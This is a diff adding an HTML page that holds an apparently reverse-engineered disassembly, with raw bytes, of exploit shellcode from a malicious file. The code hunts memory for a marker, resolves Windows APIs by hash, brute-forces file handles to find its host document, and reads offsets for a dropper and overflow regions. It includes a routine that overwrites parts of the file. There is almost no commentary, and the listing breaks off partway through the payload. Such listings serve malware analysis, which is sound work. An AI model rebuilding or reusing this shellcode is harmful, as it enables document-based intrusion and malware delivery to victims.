@@ -1,0 +1,416 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+<title>hell0 world</title>
+</head>
+<body bgcolor="#c0c0c0">
+<span style="white-space: pre; font-family: FixedSys; color: blue; background: #c0c0c0">
+
+<span style="color:gray">seg000:00000000                         </span>; Format      : Binary file
+<span style="color:gray">seg000:00000000                         </span>; Base Address: 0000h Range: 0000h - 0644h Loaded length: 0644h
+<span style="color:gray">seg000:00000000
+seg000:00000000                                         .</span>686p
+<span style="color:gray">seg000:00000000                                         </span>.mmx
+<span style="color:gray">seg000:00000000                                         </span>.model flat
+<span style="color:gray">seg000:00000000
+seg000:00000000                         ; ===========================================================================
+seg000:00000000
+seg000:00000000                         ; Segment type: Pure code
+seg000:00000000                         </span>seg000          segment byte public 'CODE' use32
+<span style="color:gray">seg000:00000000                                         </span>assume cs:seg000
+<span style="color:gray">seg000:00000000                                         </span>assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
+<span style="color:gray">seg000:00000000 </span>01 23 45 67                             <span style="color:navy">dd </span><span style="color:#008040">67452301h
+</span><span style="color:gray">seg000:00000004 </span>40 00                                   <span style="color:navy">dw </span><span style="color:#008040">40h
+</span><span style="color:maroon">seg000:00000006                         </span><span style="color:gray">; ---------------------------------------------------------------------------
+</span><span style="color:maroon">seg000:00000006 </span>EB 3F                                   <span style="color:navy">jmp     short loc_47
+</span><span style="color:maroon">seg000:00000008                         </span><span style="color:gray">; ---------------------------------------------------------------------------
+</span><span style="color:maroon">seg000:00000008
+seg000:00000008                         </span><span style="color:navy">loc_8:                                  </span><span style="color:green">; CODE XREF: seg000:00000036j
+</span><span style="color:maroon">seg000:00000008 </span>8B F4                                   <span style="color:navy">mov     esi, esp
+</span><span style="color:maroon">seg000:0000000A
+seg000:0000000A                         </span><span style="color:navy">loc_A:                                  </span><span style="color:green">; CODE XREF: seg000:loc_1Ej
+</span><span style="color:maroon">seg000:0000000A                                                                 </span><span style="color:green">; seg000:00000041j
+</span><span style="color:maroon">seg000:0000000A </span>83 C6 04                                <span style="color:navy">add     esi, </span><span style="color:green">4
+</span><span style="color:maroon">seg000:0000000D </span>8B 3E                                   <span style="color:navy">mov     edi, [esi]
+</span><span style="color:maroon">seg000:0000000F </span>8B D7                                   <span style="color:navy">mov     edx, edi
+</span><span style="color:maroon">seg000:00000011 </span>6A 43                                   <span style="color:navy">push    </span><span style="color:#ff8000">43h </span><span style="color:gray">; 'C'
+</span><span style="color:maroon">seg000:00000013 </span>58                                      <span style="color:navy">pop     eax
+</span><span style="color:maroon">seg000:00000014 </span>CD 2E                                   <span style="color:navy">int     </span><span style="color:green">2Eh             </span>; DOS 2+ internal - EXECUTE COMMAND
+<span style="color:maroon">seg000:00000014                                                                 </span>; DS:SI -&gt; counted CR-terminated command string
+<span style="color:maroon">seg000:00000016 </span>3C 05                                   <span style="color:navy">cmp     al, </span><span style="color:green">5
+</span><span style="color:maroon">seg000:00000018 </span>EB 04                                   <span style="color:navy">jmp     short loc_1E
+</span><span style="color:maroon">seg000:00000018                         </span><span style="color:gray">; ---------------------------------------------------------------------------
+seg000:0000001A </span>59 54 C3 77                             <span style="color:navy">dd </span><span style="color:#008040">77C35459h
+</span><span style="color:maroon">seg000:0000001E                         </span><span style="color:gray">; ---------------------------------------------------------------------------
+</span><span style="color:maroon">seg000:0000001E
+seg000:0000001E                         </span><span style="color:navy">loc_1E:                                 </span><span style="color:green">; CODE XREF: seg000:00000018j
+</span><span style="color:maroon">seg000:0000001E </span>74 EA                                   <span style="color:navy">jz      short loc_A
+</span><span style="color:maroon">seg000:00000020 </span>81 7F 08 40 00 04 00                    <span style="color:navy">cmp     dword ptr [edi+</span><span style="color:green">8</span><span style="color:navy">], </span><span style="color:green">40040h
+</span><span style="color:maroon">seg000:00000027 </span>74 1A                                   <span style="color:navy">jz      short loc_43
+</span><span style="color:maroon">seg000:00000029 </span>EB 0D                                   <span style="color:navy">jmp     short loc_38
+</span><span style="color:maroon">seg000:00000029                         </span><span style="color:gray">; ---------------------------------------------------------------------------
+</span><span style="color:olive">seg000:0000002B </span>00                                      <span style="color:navy">db    </span><span style="color:#008040">0
+</span><span style="color:olive">seg000:0000002C </span>00                                      <span style="color:navy">db    </span><span style="color:#008040">0
+</span><span style="color:olive">seg000:0000002D </span>00                                      <span style="color:navy">db    </span><span style="color:#008040">0
+</span><span style="color:olive">seg000:0000002E </span>00                                      <span style="color:navy">db    </span><span style="color:#008040">0
+</span><span style="color:olive">seg000:0000002F </span>00                                      <span style="color:navy">db    </span><span style="color:#008040">0
+</span><span style="color:olive">seg000:00000030 </span>00                                      <span style="color:navy">db    </span><span style="color:#008040">0
+</span><span style="color:olive">seg000:00000031 </span>00                                      <span style="color:navy">db    </span><span style="color:#008040">0
+</span><span style="color:maroon">seg000:00000032                         </span><span style="color:gray">; ---------------------------------------------------------------------------
+</span><span style="color:maroon">seg000:00000032 </span>83 EC 70                                <span style="color:navy">sub     esp, </span><span style="color:green">70h
+</span><span style="color:maroon">seg000:00000035 </span>90                                      <span style="color:navy">nop
+</span><span style="color:maroon">seg000:00000036 </span>EB D0                                   <span style="color:navy">jmp     short loc_8
+</span><span style="color:maroon">seg000:00000038                         </span><span style="color:gray">; ---------------------------------------------------------------------------
+</span><span style="color:maroon">seg000:00000038
+seg000:00000038                         </span><span style="color:navy">loc_38:                                 </span><span style="color:green">; CODE XREF: seg000:00000029j
+</span><span style="color:maroon">seg000:00000038 </span>81 7F 0C 40 00 04 00                    <span style="color:navy">cmp     dword ptr [edi+</span><span style="color:green">0Ch</span><span style="color:navy">], </span><span style="color:green">40040h
+</span><span style="color:maroon">seg000:0000003F </span>74 02                                   <span style="color:navy">jz      short loc_43
+</span><span style="color:maroon">seg000:00000041 </span>EB C7                                   <span style="color:navy">jmp     short loc_A
+</span><span style="color:maroon">seg000:00000043                         </span><span style="color:gray">; ---------------------------------------------------------------------------
+</span><span style="color:maroon">seg000:00000043
+seg000:00000043                         </span><span style="color:navy">loc_43:                                 </span><span style="color:green">; CODE XREF: seg000:00000027j
+</span><span style="color:maroon">seg000:00000043                                                                 </span><span style="color:green">; seg000:0000003Fj
+</span><span style="color:maroon">seg000:00000043 </span>FF 67 10                                <span style="color:navy">jmp     dword ptr [edi+</span><span style="color:green">10h</span><span style="color:navy">]
+</span><span style="color:maroon">seg000:00000043                         </span><span style="color:gray">; ---------------------------------------------------------------------------
+</span><span style="color:olive">seg000:00000046 </span>48                                      <span style="color:navy">db  </span><span style="color:#008040">48h </span><span style="color:gray">; H
+</span><span style="color:maroon">seg000:00000047                         </span><span style="color:gray">; ---------------------------------------------------------------------------
+</span><span style="color:maroon">seg000:00000047
+seg000:00000047                         </span><span style="color:navy">loc_47:                                 </span><span style="color:green">; CODE XREF: seg000:00000006j
+</span><span style="color:maroon">seg000:00000047 </span>48                                      <span style="color:navy">dec     eax
+</span><span style="color:maroon">seg000:00000048 </span>48                                      <span style="color:navy">dec     eax
+</span><span style="color:maroon">seg000:00000049 </span>48                                      <span style="color:navy">dec     eax
+</span><span style="color:maroon">seg000:0000004A </span>83 C4 70                                <span style="color:navy">add     esp, </span><span style="color:green">70h
+</span><span style="color:maroon">seg000:0000004D </span>60                                      <span style="color:navy">pusha
+</span><span style="color:maroon">seg000:0000004E </span>E9 DA 00 00 00                          <span style="color:navy">jmp     </span>payload
+<span style="color:black">seg000:00000053
+seg000:00000053                         </span><span style="color:gray">; =============== S U B R O U T I N E =======================================
+</span><span style="color:black">seg000:00000053
+seg000:00000053
+seg000:00000053                         </span>get_k32base     proc near               <span style="color:green">; CODE XREF: seg000:0000013Fp
+</span><span style="color:black">seg000:00000053 </span>56                                      <span style="color:navy">push    esi
+</span><span style="color:black">seg000:00000054 </span>33 C0                                   <span style="color:navy">xor     eax, eax
+</span><span style="color:black">seg000:00000056 </span>64 8B 40 30                             <span style="color:navy">mov     eax, fs:[eax+</span><span style="color:#ff8000">30h</span><span style="color:navy">]
+</span><span style="color:black">seg000:0000005A </span>8B 40 0C                                <span style="color:navy">mov     eax, [eax+</span><span style="color:green">0Ch</span><span style="color:navy">]
+</span><span style="color:black">seg000:0000005D </span>8B 70 1C                                <span style="color:navy">mov     esi, [eax+</span><span style="color:green">1Ch</span><span style="color:navy">]
+</span><span style="color:black">seg000:00000060 </span>AD                                      <span style="color:navy">lodsd
+</span><span style="color:black">seg000:00000061 </span>8B 40 08                                <span style="color:navy">mov     eax, [eax+</span><span style="color:green">8</span><span style="color:navy">]
+</span><span style="color:black">seg000:00000064 </span>5E                                      <span style="color:navy">pop     esi
+</span><span style="color:black">seg000:00000065 </span>C3                                      <span style="color:navy">retn
+</span><span style="color:black">seg000:00000065                         </span>get_k32base     endp
+<span style="color:black">seg000:00000065
+seg000:00000066
+seg000:00000066                         </span><span style="color:gray">; =============== S U B R O U T I N E =======================================
+</span><span style="color:black">seg000:00000066
+seg000:00000066
+seg000:00000066                         </span>resolve_apiz    proc near               <span style="color:green">; CODE XREF: resolve_apiz_via_hash+3p
+</span><span style="color:black">seg000:00000066
+seg000:00000066                         </span><span style="color:green">var_4           </span><span style="color:navy">= dword ptr </span><span style="color:#008040">-4
+</span><span style="color:black">seg000:00000066                         </span><span style="color:green">arg_0           </span><span style="color:navy">= dword ptr  </span><span style="color:#008040">4
+</span><span style="color:black">seg000:00000066                         </span><span style="color:green">arg_4           </span><span style="color:navy">= dword ptr  </span><span style="color:#008040">8
+</span><span style="color:black">seg000:00000066
+seg000:00000066 </span>60                                      <span style="color:navy">pusha
+</span><span style="color:black">seg000:00000067 </span>8B 6C 24 24                             <span style="color:navy">mov     ebp, [esp+</span><span style="color:green">20h</span><span style="color:navy">+</span><span style="color:green">arg_0</span><span style="color:navy">]
+</span><span style="color:black">seg000:0000006B </span>8B 45 3C                                <span style="color:navy">mov     eax, [ebp+</span><span style="color:#ff8000">3Ch</span><span style="color:navy">]
+</span><span style="color:black">seg000:0000006E </span>8B 54 05 78                             <span style="color:navy">mov     edx, [ebp+eax+</span><span style="color:#ff8000">78h</span><span style="color:navy">]
+</span><span style="color:black">seg000:00000072 </span>03 D5                                   <span style="color:navy">add     edx, ebp
+</span><span style="color:black">seg000:00000074 </span>8B 4A 18                                <span style="color:navy">mov     ecx, [edx+</span><span style="color:green">18h</span><span style="color:navy">]
+</span><span style="color:black">seg000:00000077 </span>8B 5A 20                                <span style="color:navy">mov     ebx, [edx+</span><span style="color:#ff8000">20h</span><span style="color:navy">]
+</span><span style="color:black">seg000:0000007A </span>03 DD                                   <span style="color:navy">add     ebx, ebp
+</span><span style="color:black">seg000:0000007C
+seg000:0000007C                         </span><span style="color:navy">loc_7C:                                 </span><span style="color:green">; CODE XREF: resolve_apiz+33j
+</span><span style="color:black">seg000:0000007C </span>E3 34                                   <span style="color:navy">jecxz   short loc_B2
+</span><span style="color:black">seg000:0000007E </span>49                                      <span style="color:navy">dec     ecx
+</span><span style="color:black">seg000:0000007F </span>8B 34 8B                                <span style="color:navy">mov     esi, [ebx+ecx*4]
+</span><span style="color:black">seg000:00000082 </span>03 F5                                   <span style="color:navy">add     esi, ebp
+</span><span style="color:black">seg000:00000084 </span>33 FF                                   <span style="color:navy">xor     edi, edi
+</span><span style="color:black">seg000:00000086 </span>33 C0                                   <span style="color:navy">xor     eax, eax
+</span><span style="color:black">seg000:00000088 </span>FC                                      <span style="color:navy">cld
+</span><span style="color:black">seg000:00000089
+seg000:00000089                         </span><span style="color:navy">loc_89:                                 </span><span style="color:green">; CODE XREF: resolve_apiz+2Dj
+</span><span style="color:black">seg000:00000089 </span>AC                                      <span style="color:navy">lodsb
+</span><span style="color:black">seg000:0000008A </span>84 C0                                   <span style="color:navy">test    al, al
+</span><span style="color:black">seg000:0000008C </span>74 07                                   <span style="color:navy">jz      short loc_95
+</span><span style="color:black">seg000:0000008E </span>C1 C7 13                                <span style="color:navy">rol     edi, </span><span style="color:green">13h
+</span><span style="color:black">seg000:00000091 </span>03 F8                                   <span style="color:navy">add     edi, eax
+</span><span style="color:black">seg000:00000093 </span>EB F4                                   <span style="color:navy">jmp     short loc_89
+</span><span style="color:black">seg000:00000095                         </span><span style="color:gray">; ---------------------------------------------------------------------------
+</span><span style="color:black">seg000:00000095
+seg000:00000095                         </span><span style="color:navy">loc_95:                                 </span><span style="color:green">; CODE XREF: resolve_apiz+26j
+</span><span style="color:black">seg000:00000095 </span>3B 7C 24 28                             <span style="color:navy">cmp     edi, [esp+</span><span style="color:green">20h</span><span style="color:navy">+</span><span style="color:green">arg_4</span><span style="color:navy">]
+</span><span style="color:black">seg000:00000099 </span>75 E1                                   <span style="color:navy">jnz     short loc_7C
+</span><span style="color:black">seg000:0000009B </span>8B 5A 24                                <span style="color:navy">mov     ebx, [edx+</span><span style="color:#ff8000">24h</span><span style="color:navy">]
+</span><span style="color:black">seg000:0000009E </span>03 DD                                   <span style="color:navy">add     ebx, ebp
+</span><span style="color:black">seg000:000000A0 </span>66 8B 0C 4B                             <span style="color:navy">mov     cx, [ebx+ecx*2]
+</span><span style="color:black">seg000:000000A4 </span>8B 5A 1C                                <span style="color:navy">mov     ebx, [edx+</span><span style="color:green">1Ch</span><span style="color:navy">]
+</span><span style="color:black">seg000:000000A7 </span>03 DD                                   <span style="color:navy">add     ebx, ebp
+</span><span style="color:black">seg000:000000A9 </span>8B 04 8B                                <span style="color:navy">mov     eax, [ebx+ecx*4]
+</span><span style="color:black">seg000:000000AC </span>03 C5                                   <span style="color:navy">add     eax, ebp
+</span><span style="color:black">seg000:000000AE </span>89 44 24 1C                             <span style="color:navy">mov     [esp+</span><span style="color:green">20h</span><span style="color:navy">+</span><span style="color:green">var_4</span><span style="color:navy">], eax
+</span><span style="color:black">seg000:000000B2
+seg000:000000B2                         </span><span style="color:navy">loc_B2:                                 </span><span style="color:green">; CODE XREF: resolve_apiz:loc_7Cj
+</span><span style="color:black">seg000:000000B2 </span>61                                      <span style="color:navy">popa
+</span><span style="color:black">seg000:000000B3 </span>C3                                      <span style="color:navy">retn
+</span><span style="color:black">seg000:000000B3                         </span>resolve_apiz    endp
+<span style="color:black">seg000:000000B3
+seg000:000000B4
+seg000:000000B4                         </span><span style="color:gray">; =============== S U B R O U T I N E =======================================
+</span><span style="color:black">seg000:000000B4
+seg000:000000B4
+seg000:000000B4                         </span>resolve_apiz_via_hash proc near         <span style="color:green">; CODE XREF: resolve_apiz_via_hash+Ej
+</span><span style="color:black">seg000:000000B4                                                                 </span><span style="color:green">; seg000:00000151p ...
+</span><span style="color:black">seg000:000000B4 </span>AD                                      <span style="color:navy">lodsd
+</span><span style="color:black">seg000:000000B5 </span>50                                      <span style="color:navy">push    eax
+</span><span style="color:black">seg000:000000B6 </span>52                                      <span style="color:navy">push    edx
+</span><span style="color:black">seg000:000000B7 </span>E8 AA FF FF FF                          <span style="color:navy">call    </span>resolve_apiz
+<span style="color:black">seg000:000000BC </span>AB                                      <span style="color:navy">stosd
+</span><span style="color:black">seg000:000000BD </span>83 C4 08                                <span style="color:navy">add     esp, </span><span style="color:green">8
+</span><span style="color:black">seg000:000000C0 </span>3B F1                                   <span style="color:navy">cmp     esi, ecx
+</span><span style="color:black">seg000:000000C2 </span>75 F0                                   <span style="color:navy">jnz     short </span>resolve_apiz_via_hash
+<span style="color:black">seg000:000000C4 </span>C3                                      <span style="color:navy">retn
+</span><span style="color:black">seg000:000000C4                         </span>resolve_apiz_via_hash endp
+<span style="color:black">seg000:000000C4
+seg000:000000C5
+seg000:000000C5                         </span><span style="color:gray">; =============== S U B R O U T I N E =======================================
+</span><span style="color:black">seg000:000000C5
+seg000:000000C5                         </span>; overwrite &quot;0x0d&quot; from 'offset' of length 'dwSize'
+<span style="color:black">seg000:000000C5                         </span><span style="color:gray">; Attributes: bp-based frame
+</span><span style="color:black">seg000:000000C5
+seg000:000000C5                         </span>; int __stdcall clean_wrapper(int hHnd, int dwSize, int offset, void *pfnWriteFile, void *pfnSetFilePointer)
+<span style="color:black">seg000:000000C5                         </span>clean_wrapper   proc near               <span style="color:green">; CODE XREF: seg000:000002C8p
+</span><span style="color:black">seg000:000000C5                                                                 </span><span style="color:green">; seg000:000002DCp
+</span><span style="color:black">seg000:000000C5
+seg000:000000C5                         </span><span style="color:green">var_8           </span><span style="color:navy">= dword ptr </span><span style="color:#008040">-8
+</span><span style="color:black">seg000:000000C5                         </span><span style="color:green">var_4           </span><span style="color:navy">= byte ptr </span><span style="color:#008040">-4
+</span><span style="color:black">seg000:000000C5                         </span><span style="color:green">hHnd            </span><span style="color:navy">= dword ptr  </span><span style="color:#008040">8
+</span><span style="color:black">seg000:000000C5                         </span><span style="color:green">dwSize          </span><span style="color:navy">= dword ptr  </span><span style="color:#008040">0Ch
+</span><span style="color:black">seg000:000000C5                         </span><span style="color:green">offset          </span><span style="color:navy">= dword ptr  </span><span style="color:#008040">10h
+</span><span style="color:black">seg000:000000C5                         </span><span style="color:green">pfnWriteFile    </span><span style="color:navy">= dword ptr  </span><span style="color:#008040">14h
+</span><span style="color:black">seg000:000000C5                         </span><span style="color:green">pfnSetFilePointer</span><span style="color:navy">= dword ptr  </span><span style="color:#008040">18h
+</span><span style="color:black">seg000:000000C5
+seg000:000000C5 </span>55                                      <span style="color:navy">push    ebp
+</span><span style="color:black">seg000:000000C6 </span>8B EC                                   <span style="color:navy">mov     ebp, esp
+</span><span style="color:black">seg000:000000C8 </span>83 C4 F4                                <span style="color:navy">add     esp, -</span><span style="color:green">0Ch
+</span><span style="color:black">seg000:000000CB </span>6A 00                                   <span style="color:navy">push    </span><span style="color:green">0
+</span><span style="color:black">seg000:000000CD </span>33 C0                                   <span style="color:navy">xor     eax, eax
+</span><span style="color:black">seg000:000000CF </span>50                                      <span style="color:navy">push    eax
+</span><span style="color:black">seg000:000000D0 </span>FF 75 10                                <span style="color:navy">push    [ebp+</span><span style="color:green">offset</span><span style="color:navy">]
+</span><span style="color:black">seg000:000000D3 </span>FF 75 08                                <span style="color:navy">push    [ebp+</span><span style="color:green">hHnd</span><span style="color:navy">]
+</span><span style="color:black">seg000:000000D6 </span>FF 55 18                                <span style="color:navy">call    [ebp+</span><span style="color:green">pfnSetFilePointer</span><span style="color:navy">]
+</span><span style="color:black">seg000:000000D9 </span>33 C0                                   <span style="color:navy">xor     eax, eax
+</span><span style="color:black">seg000:000000DB </span>B0 0D                                   <span style="color:navy">mov     al, </span><span style="color:green">0Dh
+</span><span style="color:black">seg000:000000DD </span>89 45 F8                                <span style="color:navy">mov     [ebp+</span><span style="color:green">var_8</span><span style="color:navy">], eax
+</span><span style="color:black">seg000:000000E0 </span>8B 4D 0C                                <span style="color:navy">mov     ecx, [ebp+</span><span style="color:green">dwSize</span><span style="color:navy">]
+</span><span style="color:black">seg000:000000E3
+seg000:000000E3                         </span><span style="color:navy">loc_E3:                                 </span><span style="color:green">; CODE XREF: clean_wrapper+36j
+</span><span style="color:black">seg000:000000E3 </span>51                                      <span style="color:navy">push    ecx
+</span><span style="color:black">seg000:000000E4 </span>6A 00                                   <span style="color:navy">push    </span><span style="color:green">0
+</span><span style="color:black">seg000:000000E6 </span>8D 45 FC                                <span style="color:navy">lea     eax, [ebp+</span><span style="color:green">var_4</span><span style="color:navy">]
+</span><span style="color:black">seg000:000000E9 </span>50                                      <span style="color:navy">push    eax
+</span><span style="color:black">seg000:000000EA </span>6A 01                                   <span style="color:navy">push    </span><span style="color:green">1
+</span><span style="color:black">seg000:000000EC </span>8D 45 F8                                <span style="color:navy">lea     eax, [ebp+</span><span style="color:green">var_8</span><span style="color:navy">]
+</span><span style="color:black">seg000:000000EF </span>50                                      <span style="color:navy">push    eax
+</span><span style="color:black">seg000:000000F0 </span>FF 75 08                                <span style="color:navy">push    [ebp+</span><span style="color:green">hHnd</span><span style="color:navy">]
+</span><span style="color:black">seg000:000000F3 </span>FF 55 14                                <span style="color:navy">call    [ebp+</span><span style="color:green">pfnWriteFile</span><span style="color:navy">]
+</span><span style="color:black">seg000:000000F6 </span>59                                      <span style="color:navy">pop     ecx
+</span><span style="color:black">seg000:000000F7 </span>49                                      <span style="color:navy">dec     ecx
+</span><span style="color:black">seg000:000000F8 </span>83 F9 00                                <span style="color:navy">cmp     ecx, </span><span style="color:green">0
+</span><span style="color:black">seg000:000000FB </span>75 E6                                   <span style="color:navy">jnz     short loc_E3
+</span><span style="color:black">seg000:000000FD </span>C9                                      <span style="color:navy">leave
+</span><span style="color:black">seg000:000000FE </span>C2 14 00                                <span style="color:navy">retn    </span><span style="color:green">14h
+</span><span style="color:black">seg000:000000FE                         </span>clean_wrapper   endp
+<span style="color:black">seg000:000000FE
+seg000:000000FE                         </span><span style="color:gray">; ---------------------------------------------------------------------------
+seg000:00000101 </span>AD 9B 7D DF                             <span style="color:navy">dd </span><span style="color:#008040">0DF7D9BADh
+</span><span style="color:gray">seg000:00000105 </span>FB 97 FD 0F                             <span style="color:navy">dd </span><span style="color:#008040">0FFD97FBh
+</span><span style="color:gray">seg000:00000109 </span>8E 4E 0E EC                             <span style="color:navy">dd </span><span style="color:#008040">0EC0E4E8Eh
+</span><span style="color:gray">seg000:0000010D </span>AC 08 DA 76                             <span style="color:navy">dd </span><span style="color:#008040">76DA08ACh
+</span><span style="color:gray">seg000:00000111 </span>16 65 FA 10                             <span style="color:navy">dd </span><span style="color:#008040">10FA6516h
+</span><span style="color:gray">seg000:00000115 </span>1F 79 0A E8                             <span style="color:navy">dd </span><span style="color:#008040">0E80A791Fh
+</span><span style="color:gray">seg000:00000119 </span>A5 17 00 7C                             <span style="color:navy">dd </span><span style="color:#008040">7C0017A5h
+</span><span style="color:gray">seg000:0000011D </span>33 CA 8A 5B                             <span style="color:navy">dd </span><span style="color:#008040">5B8ACA33h
+</span><span style="color:gray">seg000:00000121 </span>EC 97 03 0C                             <span style="color:navy">dd </span><span style="color:#008040">0C0397ECh
+</span><span style="color:gray">seg000:00000125 </span>66 3C 7B ED                             <span style="color:navy">dd </span><span style="color:#008040">0ED7B3C66h
+</span><span style="color:gray">seg000:00000129 </span>6C 5D A7 67                             <span style="color:navy">dd </span><span style="color:#008040">67A75D6Ch
+</span><span style="color:maroon">seg000:0000012D                         </span><span style="color:gray">; ---------------------------------------------------------------------------
+</span><span style="color:maroon">seg000:0000012D
+seg000:0000012D                         </span>payload<span style="color:navy">:                                </span><span style="color:green">; CODE XREF: seg000:0000004Ej
+</span><span style="color:maroon">seg000:0000012D </span>55                                      <span style="color:navy">push    ebp
+</span><span style="color:maroon">seg000:0000012E </span>8B EC                                   <span style="color:navy">mov     ebp, esp
+</span><span style="color:maroon">seg000:00000130 </span>83 C4 98                                <span style="color:navy">add     esp, -</span><span style="color:green">68h
+</span><span style="color:maroon">seg000:00000133 </span>E8 00 00 00 00                          <span style="color:navy">call    $+</span><span style="color:green">5
+</span><span style="color:maroon">seg000:00000138 </span>5E                                      <span style="color:navy">pop     esi
+</span><span style="color:maroon">seg000:00000139 </span>81 EE 37 00 00 00                       <span style="color:navy">sub     esi, </span><span style="color:#ff8000">37h </span><span style="color:gray">; '7'
+</span><span style="color:maroon">seg000:0000013F </span>E8 0F FF FF FF                          <span style="color:navy">call    </span>get_k32base
+<span style="color:maroon">seg000:00000144 </span>8B D0                                   <span style="color:navy">mov     edx, eax
+</span><span style="color:maroon">seg000:00000146 </span>8D 7D 98                                <span style="color:navy">lea     edi, [ebp-</span><span style="color:green">68h</span><span style="color:navy">]
+</span><span style="color:maroon">seg000:00000149 </span>8B CE                                   <span style="color:navy">mov     ecx, esi
+</span><span style="color:maroon">seg000:0000014B </span>81 C1 24 00 00 00                       <span style="color:navy">add     ecx, </span><span style="color:#ff8000">24h </span><span style="color:gray">; '$'
+</span><span style="color:maroon">seg000:00000151 </span>E8 5E FF FF FF                          <span style="color:navy">call    </span>resolve_apiz_via_hash
+<span style="color:maroon">seg000:00000156 </span>81 C1 08 00 00 00                       <span style="color:navy">add     ecx, </span><span style="color:green">8
+</span><span style="color:maroon">seg000:0000015C </span>51                                      <span style="color:navy">push    ecx
+</span><span style="color:maroon">seg000:0000015D </span>68 72 74 00 00                          <span style="color:navy">push    </span><span style="color:green">'tr'
+</span><span style="color:maroon">seg000:00000162 </span>68 6D 73 76 63                          <span style="color:navy">push    </span><span style="color:green">'cvsm'
+</span><span style="color:maroon">seg000:00000167 </span>54                                      <span style="color:navy">push    esp
+</span><span style="color:maroon">seg000:00000168 </span>FF 55 A0                                <span style="color:navy">call    [ebp+(</span>_X.LoadLibraryA<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:0000016B </span>8B D0                                   <span style="color:navy">mov     edx, eax
+</span><span style="color:maroon">seg000:0000016D </span>59                                      <span style="color:navy">pop     ecx
+</span><span style="color:maroon">seg000:0000016E </span>59                                      <span style="color:navy">pop     ecx
+</span><span style="color:maroon">seg000:0000016F </span>59                                      <span style="color:navy">pop     ecx
+</span><span style="color:maroon">seg000:00000170 </span>E8 3F FF FF FF                          <span style="color:navy">call    </span>resolve_apiz_via_hash
+<span style="color:maroon">seg000:00000175 </span>B8 CF B7 03 00                          <span style="color:navy">mov     eax, </span><span style="color:green">243663
+</span><span style="color:maroon">seg000:0000017A </span>89 45 EC                                <span style="color:navy">mov     [ebp+(</span>_X.dwSize<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)], eax </span><span style="color:gray">; 243663
+</span><span style="color:maroon">seg000:0000017D </span>B8 4B 01 00 00                          <span style="color:navy">mov     eax, </span><span style="color:green">14Bh
+</span><span style="color:maroon">seg000:00000182 </span>89 45 C8                                <span style="color:navy">mov     [ebp+(</span>_X.dwTriggerOff<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)], eax </span><span style="color:gray">; 14Bh
+</span><span style="color:maroon">seg000:00000185 </span>B8 11 06 00 00                          <span style="color:navy">mov     eax, </span><span style="color:green">611h
+</span><span style="color:maroon">seg000:0000018A </span>89 45 CC                                <span style="color:navy">mov     [ebp+(</span>_X.dwOverflowSize1<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)], eax </span><span style="color:gray">; 611h
+</span><span style="color:maroon">seg000:0000018D </span>B8 33 7A 01 00                          <span style="color:navy">mov     eax, </span><span style="color:green">17A33h
+</span><span style="color:maroon">seg000:00000192 </span>89 45 D0                                <span style="color:navy">mov     [ebp+(</span>_X.dwDrpperOff<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)], eax </span><span style="color:gray">; 17A33h
+</span><span style="color:maroon">seg000:00000195 </span>B8 C8 1E 01 00                          <span style="color:navy">mov     eax, </span><span style="color:green">11EC8h
+</span><span style="color:maroon">seg000:0000019A </span>89 45 F4                                <span style="color:navy">mov     [ebp+(</span>_X.dwDrpSize<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)], eax </span><span style="color:gray">; 11EC8h
+</span><span style="color:maroon">seg000:0000019D </span>B8 9C 3D 02 00                          <span style="color:navy">mov     eax, </span><span style="color:green">23D9Ch
+</span><span style="color:maroon">seg000:000001A2 </span>89 45 F0                                <span style="color:navy">mov     [ebp+(</span>_X.dwOverflowSize2<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)], eax </span><span style="color:gray">; 23D9Ch
+</span><span style="color:maroon">seg000:000001A5 </span>33 F6                                   <span style="color:navy">xor     esi, esi
+</span><span style="color:maroon">seg000:000001A7 </span>8B 7D EC                                <span style="color:navy">mov     edi, [ebp+(</span>_X.dwSize<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)] </span><span style="color:gray">; 243663
+</span><span style="color:maroon">seg000:000001AA </span>89 75 FC                                <span style="color:navy">mov     [ebp+(</span>_X.hHandle<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)], esi
+</span><span style="color:maroon">seg000:000001AD
+seg000:000001AD                         </span>@brute_search<span style="color:navy">:                          </span><span style="color:green">; CODE XREF: seg000:000001CCj
+</span><span style="color:maroon">seg000:000001AD </span>83 45 FC 04                             <span style="color:navy">add     [ebp+(</span>_X.hHandle<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)], </span><span style="color:green">4
+</span><span style="color:maroon">seg000:000001B1 </span>8D 45 C4                                <span style="color:navy">lea     eax, [ebp+(</span>_X.dwSizeH<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:000001B4 </span>50                                      <span style="color:navy">push    eax
+</span><span style="color:maroon">seg000:000001B5 </span>FF 75 FC                                <span style="color:navy">push    [ebp+(</span>_X.hHandle<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:000001B8 </span>FF 55 98                                <span style="color:navy">call    [ebp+(</span>_X.GetFileSize<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)]
+</span><span style="color:maroon">seg000:000001BB </span>3B C7                                   <span style="color:navy">cmp     eax, edi
+</span><span style="color:maroon">seg000:000001BD </span>74 0F                                   <span style="color:navy">jz      short </span>@found
+<span style="color:maroon">seg000:000001BF </span>81 7D FC 00 00 01 00                    <span style="color:navy">cmp     [ebp+(</span>_X.hHandle<span style="color:navy">-</span><span style="color:green">68h</span><span style="color:navy">)], </span><span style="color:green">65536
+</span><span style="color:maroon">seg000:000001C6 </span>0F 84 15 01 00 00                       <span style="color:navy">jz      </span>@exit
+<span style="color:maroon">seg000:000001CC </span>EB DF                                   <span style="color:navy">jmp     short </span>@brute_search
+<span style="color:maroon">seg000:000001CE                         </span><span style="color:gray">; ---------------------------------------------------------------------------
